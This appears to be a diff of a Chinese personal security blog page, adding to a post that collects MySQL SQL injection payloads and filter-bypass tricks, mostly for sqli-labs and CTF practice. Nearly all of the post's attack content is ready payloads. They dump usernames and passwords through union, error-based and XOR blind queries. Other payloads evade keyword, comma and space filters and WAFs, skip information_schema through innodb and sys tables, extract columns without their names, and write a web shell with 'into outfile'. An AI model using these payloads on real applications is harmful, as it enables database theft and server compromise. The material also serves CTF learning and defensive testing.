@@ -431,21 +431,21 @@
             <div class="post-info">
                 <div class="post-date info-break-policy">
                     <i class="fa fa-calendar-minus-o fa-fw"></i>Publish Date:&nbsp;&nbsp;
-                    2019-09-26
+                    2019-12-10
                 </div>
 
                 
                     
                     <div class="info-break-policy">
                         <i class="fa fa-file-word-o fa-fw"></i>Word Count:&nbsp;&nbsp;
-                        5.9k
+                        6.6k
                     </div>
                     
 
                     
                     <div class="info-break-policy">
                         <i class="fa fa-clock-o fa-fw"></i>Read Times:&nbsp;&nbsp;
-                        22 Min
+                        25 Min
                     </div>
                     
                 
@@ -469,7 +469,7 @@
 <h3 id="时间盲注入"><a href="#时间盲注入" class="headerlink" title="时间盲注入"></a>时间盲注入</h3><p> sleep()函数</p>
 <h3 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h3><p> @@version显示当前版本号<br> @@basedir显示当前路径<br> current_user显示当前用户名</p>
 <h2 id="基础无过滤注入"><a href="#基础无过滤注入" class="headerlink" title="基础无过滤注入"></a>基础无过滤注入</h2><p> 这种类型的注入都是非常简单的，找到注入点之后可以尝试用SQLmap直接自动化完成，sqli-lab的less1-10差不多就是这个水平，在此主要记录一下常用函数和操作。</p>
-<h3 id="union联合注入-1"><a href="#union联合注入-1" class="headerlink" title="union联合注入"></a>union联合注入</h3><p> 这种注入需要有回显位，使用联合注入<code>union select</code>，主要注入参数需为一个错误指，才能显示联合查询后面的内容，使用<code>order by</code>语句或者直接尝试来探取行数进行回显。<br> 使用<code>group_concat</code>聚合函数将查询结果一次性输出，提高效率。<br> 以sqli-lab的less1为例，payload为：<br> 数据库名：<br><code>?id=-1&#39; union select 1,2,database() --+</code><br> 表名：<br><code>?id=-1 union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database() --+</code><br> 列名：<br> <code>?id=-1 union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&#39;users&#39; --+</code><br> 数据：<br> <code>id=-1 union  select 1,2,group_concat(username,0x3a,password) from users --+</code><br> 此处<code>group_concat</code>函数中间的参数为一个字符，将username和password分割开来，便于观察</p>
+<h3 id="union联合注入-1"><a href="#union联合注入-1" class="headerlink" title="union联合注入"></a>union联合注入</h3><p> 这种注入需要有回显位，使用联合注入<code>union select</code>，主要注入参数需为一个错误指，才能显示联合查询后面的内容，使用<code>order by</code>语句或者直接尝试来探取行数进行回显。<br> 使用<code>group_concat</code>聚合函数将查询结果一次性输出，提高效率。<br> 以sqli-lab的less1为例，payload为：<br> 数据库名：<br><code>?id=-1&#39; union select 1,2,database() --+</code><br> 表名：<br><code>?id=-1 union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database() --+</code><br> 列名：<br> <code>?id=-1 union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&#39;users&#39; --+</code><br> 数据：<br> <code>id=-1 union select 1,2,group_concat(username,0x3a,password) from users --+</code><br> 此处<code>group_concat</code>函数中间的参数为一个字符，将username和password分割开来，便于观察</p>
 <h3 id="基于错误的注入"><a href="#基于错误的注入" class="headerlink" title="基于错误的注入"></a>基于错误的注入</h3><p> 这种类型就是会把SQL语句的错误给返回出来，那么可以通过报错信息来获得敏感数据，常用函数为<code>extractvalue</code>和<code>updatexml</code>，用concat函数将待查询语句聚合为该函数的第二个参数，由于我们查询的数据不符合Xpath语法，产生报错获取信息<br> 此时需要查询的id为真，需要预先知道一个用户名（admin）或id(1)<br> 使用格式为：<br> <code>?id=1&#39;and extractvalue(1,concat(查询语句)) --+</code><br> 报错显示可能存在长度限制，使用not in语句查询剩余值<br> 同样sqli-lab中less1为例<br> payload：<code>?id=1&#39; and extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name=&#39;users&#39; and column_name not in (&#39;user_id&#39;,&#39;first_name&#39;,&#39;last_name&#39;)))) --+</code></p>
 <h4 id="双查询注入"><a href="#双查询注入" class="headerlink" title="双查询注入"></a>双查询注入</h4><p>标准公式<code>union select 1 from (select count(),concat(floor(rand(0)*2),(注入语句))a from information_schema.tables group by a)b --+</code><br>这个方法具有一定的随机性，爆出来的数据取决于rand()函数，并且是以报错的形式显示出来。不怎么实用，原理如下<br><a href="https://www.cnblogs.com/laoxiajiadeyun/p/10278512.html" target="_blank" rel="noopener">https://www.cnblogs.com/laoxiajiadeyun/p/10278512.html</a></p>
 <h3 id="盲注入"><a href="#盲注入" class="headerlink" title="盲注入"></a>盲注入</h3><p> 基于时间和bool类型的盲注入界面没有错误回显，也没有查询显示位，bool注入一般只有一个标志位确认你目前的语句是否正确<br> 时间类型的注入可能页面无任何回显，使用<code>sleep()</code>函数延迟判断结果是否正确<br> 此类注入手工注入十分麻烦，需要用一定的python基础写脚本跑比较好<br> 常用语句有<code>if length left limit</code><br> left(arg,n)取arg左边n位，用if判断<br> limit x,1 从第x位（从0开始）取1个</p>
@@ -506,12 +506,15 @@
 <h3 id="and和or被过滤"><a href="#and和or被过滤" class="headerlink" title="and和or被过滤"></a>and和or被过滤</h3><p>在or被过滤的同时，要注意order，information，password等词也受到了影响<br>这种过滤存在几种情况<br>1.and和or被替换为空，这种情况只需双写即可绕过。如<code>anandd oorr</code>即可<br>2.只是小写部分或大写被过滤，可用大小写混搭方法绕过，如<code>aND</code><br>3.and和or被彻底封死，我们还可以使用&amp;&amp;和||来代替</p>
 <h4 id="ps-1"><a href="#ps-1" class="headerlink" title="ps:"></a>ps:</h4><p>这里需要注意的是&amp;会被认为是变量直接的分隔符，我们只需用其url编码进行提交，将其替换为%26即可，即一些具有特殊意义的字符串可以通过url编码的形式传递来避免其发挥作用（我对不起张师傅讲过的课呜呜呜）</p>
 <h3 id="空格被过滤"><a href="#空格被过滤" class="headerlink" title="空格被过滤"></a>空格被过滤</h3><p>替换方案：url编码 %20=空格，%09=tab %0a=换行 %0b=竖直tab %0c=新的一页 %0d=return %a0=Linux下解析为空格，Windows下为不可见字符 皆可替换<br>/**/注释符代替空格<br>（）括号绕过空格，这里要注意括号括起的范围，防止查询语句出错<br>样例payload：<br><code>?id=0&#39;union%3Aselect(1),(database()),(3)or(1)=&#39;1</code><br>这里不能将select后面的语句全部用括号括起来，而是需要每个用括号括起来之后用逗号连接</p>
+<h4 id="补一个调了好久的payload"><a href="#补一个调了好久的payload" class="headerlink" title="补一个调了好久的payload"></a>补一个调了好久的payload</h4><p><code>select(ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema)=database())from(1))));</code></p>
+<p><code>(select(ascii(substr((查询语句)from(1))))=a);</code><br>顺带没用上逗号</p>
 <h3 id="异或盲注入"><a href="#异或盲注入" class="headerlink" title="异或盲注入"></a>异或盲注入</h3><p>除去union联合注入，使用异或(^)盲注入也是一种办法<br>这种方法比较容易用括号拼出来语句，比较使用，但是注入时需注意符号优先级，比如在^面前，大小于号和等号的优先级是不一样的，最简单的解决方案就是把该异或判断里面的所有内容再用一个括号括起来即可<br>样例payload：<br><code>?id=1&#39;^(left((select(database())),1)&lt;&#39;q&#39;)^&#39;1</code><br>纯用括号的payload：<br><code>?id=1&#39;^(left((select(group_concat(table_name))from(information_schema.tables)where(table_schema=database())),9)=&#39;emails,re&#39;)^&#39;1</code><br>用group_concat函数把所有的表名连接起来，以逗号分隔，不需使用limit，即可直接猜解表名<br><strong>一定要注意这里要把后面注入的语句整体用括号括起来！！！不然就会存在异或优先级不同导致注入失败</strong></p>
 <h4 id="异或注入测试被过滤字符"><a href="#异或注入测试被过滤字符" class="headerlink" title="异或注入测试被过滤字符"></a>异或注入测试被过滤字符</h4><p><code>?id=1&#39;^length(&#39;测试字符串&#39;)&gt;0 #</code>即可测试被测试字符串是否被替换为空，进行被过滤项的测试</p>
 <h3 id="select和union被过滤的注入"><a href="#select和union被过滤的注入" class="headerlink" title="select和union被过滤的注入"></a>select和union被过滤的注入</h3><p>遇到只是去掉第一次出现的select和union时双写即可<code>selselectect</code><br>有的只过滤全大写或全小写，大小写混搭即可<code>UniOn sEleCT</code><br>利用注释打断单词<code>u/**/NiOn sE/**/lec/**/T</code></p>
 <h4 id="内联注释"><a href="#内联注释" class="headerlink" title="内联注释"></a>内联注释</h4><p>内联注释的作用就是时其他数据库将该内容视为注释，而MySQL则将该内容当做正常代码处理，提高MySQL与其他数据库的兼容性，同时内联注释中可以添加数字作为版本号，使得该语句只能在目前版本大于等于该版本号的情况下才能运行，可以此绕过部分检测<br>内联注释格式为<code>/*!xxxxxx*/</code><br><code>/*!union*/ /*!50010select*/</code>就可以绕过对<code>union select</code>的检测</p>
 <h4 id="堆叠注入不使用select"><a href="#堆叠注入不使用select" class="headerlink" title="堆叠注入不使用select"></a>堆叠注入不使用select</h4><p>刚做了一个题，没得select我是真的没办法，见下文堆叠注入</p>
-<h3 id="逗号被过滤的注入"><a href="#逗号被过滤的注入" class="headerlink" title="逗号被过滤的注入"></a>逗号被过滤的注入</h3><p>主要存在于盲注使用left，limit，substr函数等场合<br>limit使用offset绕过<br>样例payload：<br><code>select * from user limit 1 offset 0</code><br>substr()和mid()函数可以使用from to的方法绕过逗号<br>样例payload：<br><code>select substr(database() from 1 for 1)</code><br>联合注入中使用join绕过<br>样例payload：<br><code>union select * from (select 1)a join (select 2)b</code>其中a,b为表的别名</p>
+<h3 id="逗号被过滤的注入"><a href="#逗号被过滤的注入" class="headerlink" title="逗号被过滤的注入"></a>逗号被过滤的注入</h3><p>主要存在于盲注使用left，limit，substr函数等场合<br>limit使用offset绕过<br>样例payload：<br><code>select * from user limit 1 offset 0</code><br>substr()和mid()函数可以使用from to的方法绕过逗号<br>样例payload：<br><code>select substr(database() from 1 for 1)</code> 这里for 1指截取一位，实际上不要也可以（因为有时候or也没得了）</p>
+<h4 id="join函数辅助注入"><a href="#join函数辅助注入" class="headerlink" title="join函数辅助注入"></a>join函数辅助注入</h4><p>需在可使用union联合注入时使用，主要用于逗号被过滤的情形<br>使用join语句可以将多个表拼接到一起进行查询，这时每个表需要设置一个别名，且注意查询数要与列数一致，假设有三列，样例payload:<code>union select * from ((select 1)a join (select 2)b join (select database())c)</code>，一个select语句内可用group_concat等函数进行更深层次的查询<br>马师傅用的一个payload<br><code>UNION SELECT * from ((select+1)a join (select 234)b join(select 3)c join(select group_concat(mdzz.3) from (select * from (select * from (select 1)asf join (select+2)adf join (select 3)asdnfio)ooo union select * from fl111aa44a99g)mdzz)d)</code><br>(说实话我没看懂为什么套了这么多层union select，我第一层直接查flag不就完了吗)</p>
 <h3 id="大小于号被过滤的注入"><a href="#大小于号被过滤的注入" class="headerlink" title="大小于号被过滤的注入"></a>大小于号被过滤的注入</h3><p>同样常见于盲注，需要进行比较加快判断（也可以自己写脚本遍历就不怕了）<br>greatest函数和least函数返回参数列表中的最大/小值<br>所以一个比较字符是否大于64的语句可以写为：<br><code>greatest(ascii(substr(database(),0,1)),64)=64</code></p>
 <h3 id="等号被过滤的注入"><a href="#等号被过滤的注入" class="headerlink" title="等号被过滤的注入"></a>等号被过滤的注入</h3><p>等号可以直接用like语句替换，也可以使用&lt;&gt;不等号进行代替</p>
 <h3 id="具有WAF防御的注入"><a href="#具有WAF防御的注入" class="headerlink" title="具有WAF防御的注入"></a>具有WAF防御的注入</h3><p>应该是有两个服务器，一个外层服务器将数据进过判别后再提交至内部服务器进行处理，由于两个服务器对同名参数的处理不同，可以创建两个同名参数，一个是正常数据另一个是恶意数据进行WAF防御的绕过<br>由于环境问题没有自己测试，只能贴一个文章了<br><a href="https://blog.csdn.net/nzjdsds/article/details/77758824" target="_blank" rel="noopener">https://blog.csdn.net/nzjdsds/article/details/77758824</a></p>
@@ -540,6 +543,15 @@
 <h3 id="procedure-analyse报错注入"><a href="#procedure-analyse报错注入" class="headerlink" title="procedure analyse报错注入"></a>procedure analyse报错注入</h3><p>是报错注入的一种，使用方法<code>procedure analyse(extractvalue(.....))</code></p>
 <h3 id="聚合函数注入"><a href="#聚合函数注入" class="headerlink" title="聚合函数注入"></a>聚合函数注入</h3><p>这里也可以使用聚合函数进行注入<code>?id=1&#39; and (select....聚合注入语句)</code></p>
 <h3 id="导入木马注入"><a href="#导入木马注入" class="headerlink" title="导入木马注入"></a>导入木马注入</h3><p>order by后可以使用<code>?id=1&#39; into outfile &#39;路径&#39;  lines terminated by 0x....</code>0x后为被16进制转码的文件，将木马写入该路径下</p>
+<h3 id="bypass-infromation-schema"><a href="#bypass-infromation-schema" class="headerlink" title="bypass infromation_schema"></a>bypass infromation_schema</h3><p>常出现在对or的限制中，同时躺枪的还有order,password等语句</p>
+<h4 id="innoDB引擎绕过"><a href="#innoDB引擎绕过" class="headerlink" title="innoDB引擎绕过"></a>innoDB引擎绕过</h4><p>该库在MySQL版本大于5.6.x的情况下存在两个表innodb_index_stats，innodb_table_stats<br>数据库版本可以用@@version或者version()查看<br><code>union select group_concat(table_name) from mysql.innodb_table_stats where database_name=database();</code>获取表名<br>使用innodb_index_stats获取库名</p>
+<h4 id="sys库绕过"><a href="#sys库绕过" class="headerlink" title="sys库绕过"></a>sys库绕过</h4><p>innoDB绕过需要开启innoDB引擎，而mysql默认配置中该引擎是关闭的<br>使用sys库获取数据的话需要用户权限为root，可通过user()进行查看</p>
+<p>使用<code>sys.schema_auto_increment_columns</code>库可以获取带有自增id列的表的表名<br>使用<code>sys.schema_table_statistics_with_buffer</code>和<code>sys.x$schema_table_statistics_with_buffer</code>库可以获取任意表名（大概？）</p>
+<h4 id="join无列名注入"><a href="#join无列名注入" class="headerlink" title="join无列名注入"></a>join无列名注入</h4><p>先记一下payload<br>获取第一个列名<br><code>?id=-1&#39; union all select*from (select * from users as a join users b)c</code><br>获取后续列名<br><code>?id=-1&#39; union all select*from (select * from users as a join users b using(id,username))c--+</code></p>
+<h4 id="已知表名情况下爆破列名"><a href="#已知表名情况下爆破列名" class="headerlink" title="已知表名情况下爆破列名"></a>已知表名情况下爆破列名</h4><p>利用(select 1,2,3,4,5 union select * from table_name)alias<br>此处需要反引号不被过滤<br>获得一个将所有列名用数字表示的表，然后select `3` from (select 1,2,3,4,5 union select * from table_name)alias 即可将第三列无需列名的选出<br>结合实际情况的payload<br>select author_id,title from posts where author_id= <code>-1 union select 1,(select \</code>3` from (select 1,2,3,4,5 union select * from table_name)alias limit 0,1)` limit是保证查出来的数据只有一个，可以试试调一下payload用group_concat能不能整合一下</p>
+<p>逗号被过滤时多取几个别名，可以不用逗号<br><code>select a from (select * from (select 1 \</code>a`)m join (select 2 `b`)n join (select 3 `c`)t where 0 union select * from table2)x;`</p>
+<h4 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h4><p><a href="https://xz.aliyun.com/t/4105#toc-0" target="_blank" rel="noopener">在不知道 MySQL 列名的情况下泄露数据的 SQL 注入技巧</a><br><a href="https://www.anquanke.com/post/id/193512" target="_blank" rel="noopener">聊一聊bypass information_schema</a></p>
+<h2 id="参考链接-1"><a href="#参考链接-1" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://www.jianshu.com/p/a63912d4b5ad" target="_blank" rel="noopener">https://www.jianshu.com/p/a63912d4b5ad</a></p>
 
             </div>
             <hr/>
@@ -700,7 +712,7 @@
                   property="dct:title" rel="dct:type">
                     《SQL injection》
                 </span> by
-            <a xmlns:cc="http://creativecommons.org/ns#" href="/2019/09/26/SQL%20injection/" property="cc:attributionName"
+            <a xmlns:cc="http://creativecommons.org/ns#" href="/2019/12/10/SQL%20injection/" property="cc:attributionName"
                rel="cc:attributionURL">
                 Z3ratu1
             </a> is licensed under a
@@ -740,80 +752,29 @@
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up">
+        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="fa fa-chevron-left"></i>&nbsp;Previous</div>
+                <i class="fa fa-dot-circle-o"></i>&nbsp;Current
+            </div>
             <div class="card">
-                <a href="/2019/09/27/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/">
+                <a href="/2019/12/10/SQL%20injection/">
                     <div class="card-image">
                         
-                        <img src="/img/note.jpg" class="responsive-img" alt="PHP中的反序列化漏洞">
+                        <img src="/img/php.jpg" class="responsive-img" alt="SQL injection">
                         
-                        <span class="card-title">PHP中的反序列化漏洞</span>
+                        <span class="card-title">SQL injection</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            PHP中的反序列化漏洞可能利用反序列化的提示代码中出现file_get_content等文件操作相关函数unserialze，serialze等危险函数类中存在__wakeup，__toString，__call，__sleep等魔法方法这
-                        
-                    </div>
-                    <div class="publish-info">
-                        <span class="publish-date">
-                            <i class="fa fa-clock-o fa-fw icon-date"></i>2019-09-27
-                        </span>
-                        <span class="publish-author">
-                            
-                            <i class="fa fa-bookmark fa-fw icon-category"></i>
-                            
-                            <a href="/categories/%E7%AC%94%E8%AE%B0/" class="post-category" target="_blank">
-                                    笔记
-                                </a>
-                            
-                            
-                        </span>
-                    </div>
-                </div>
-                
-                <div class="card-action article-tags">
-                    
-                    <a href="/tags/php/" target="_blank">
-                        <span class="chip bg-color">php</span>
-                    </a>
-                    
-                    <a href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" target="_blank">
-                        <span class="chip bg-color">反序列化</span>
-                    </a>
-                    
-                </div>
-                
-            </div>
-        </div>
-        
-        
-        <div class="article col s12 m6" data-aos="fade-up">
-            <div class="article-badge right-badge text-color">
-                Next&nbsp;<i class="fa fa-chevron-right"></i>
-            </div>
-            <div class="card">
-                <a href="/2019/09/10/XSS/">
-                    <div class="card-image">
-                        
-                        <img src="/img/note.jpg" class="responsive-img" alt="XSS">
-                        
-                        <span class="card-title">XSS</span>
-                    </div>
-                </a>
-                <div class="card-content article-content">
-                    <div class="summary block-with-text">
-                        
-                            XSS自己测试的时候要意识到Chrome，IE这些浏览器都自带一个XSS的过滤，做题或者测试建议用火狐XSS漏洞发生在用户输入的数据未经处理就放入前端JS代码的情况下，常见的XSS漏洞有反射型XSS和储存型XSS
-简单无过滤直接闭合一下括号
+                            SQL injection 对SQL注入的一些常见payload和不同类型注入的总结
+测试闭合字符 包围情况不外乎’1’,”1”,(‘1’),(“1”),以及我见到的最阴的((‘1’))这种类型 有的输入id的也不使用东西进行包裹，直接整形
                         
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="fa fa-clock-o fa-fw icon-date"></i>2019-09-10
+                                <i class="fa fa-clock-o fa-fw icon-date"></i>2019-12-10
                             </span>
                         <span class="publish-author">
                             
@@ -827,15 +788,66 @@
                         </span>
                     </div>
                 </div>
+
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/JavaScript/" target="_blank">
-                        <span class="chip bg-color">JavaScript</span>
+                    <a href="/tags/php/" target="_blank">
+                        <span class="chip bg-color">php</span>
                     </a>
                     
-                    <a href="/tags/XSS/" target="_blank">
-                        <span class="chip bg-color">XSS</span>
+                    <a href="/tags/SQLI/" target="_blank">
+                        <span class="chip bg-color">SQLI</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge right-badge text-color">
+                Next&nbsp;<i class="fa fa-chevron-right"></i>
+            </div>
+            <div class="card">
+                <a href="/2019/12/10/%E4%B8%89%E5%8F%B6%E8%8D%89%E6%8B%9B%E6%96%B0%E8%B5%9B/">
+                    <div class="card-image">
+                        
+                        <img src="/img/ctf1.jpg" class="responsive-img" alt="三叶草招新赛部分wp">
+                        
+                        <span class="card-title">三叶草招新赛部分wp</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            三叶草招新赛部分wp最近是三叶草招新，不愧是强队，招新赛都这么难，学习了QWQ
+性感黄阿姨在线聊天打开是一个对话框，输入表情包可以获得三叶草师傅们的表情包（没有什么实际意义）题目分两层，一层PHP弱类型一层XXE（xml实体注入）
+弱类型比
+                        
+                    </div>
+                    <div class="publish-info">
+                            <span class="publish-date">
+                                <i class="fa fa-clock-o fa-fw icon-date"></i>2019-12-10
+                            </span>
+                        <span class="publish-author">
+                            
+                            <i class="fa fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/" class="post-category" target="_blank">
+                                    刷题记录
+                                </a>
+                            
+                            
+                        </span>
+                    </div>
+                </div>
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/xxe/" target="_blank">
+                        <span class="chip bg-color">xxe</span>
                     </a>
                     
                 </div>
@@ -952,7 +964,7 @@
         <div class="col s12 m8 l8 copy-right">
             
             &nbsp;<i class="fa fa-area-chart"></i>&nbsp;站点总字数:&nbsp;<span
-                class="white-color">14.7k</span>&nbsp;字
+                class="white-color">17.1k</span>&nbsp;字
             
             
             
